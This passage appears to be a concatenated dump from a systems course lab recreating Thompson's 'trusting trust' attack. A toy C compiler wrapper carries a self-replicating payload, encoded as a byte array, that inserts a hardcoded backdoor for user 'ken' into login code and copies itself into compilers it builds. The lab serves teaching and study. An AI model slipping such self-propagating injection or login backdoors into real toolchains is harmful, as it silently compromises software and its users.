	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
Binary files cc-attacked and cc-attacked2 differ
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
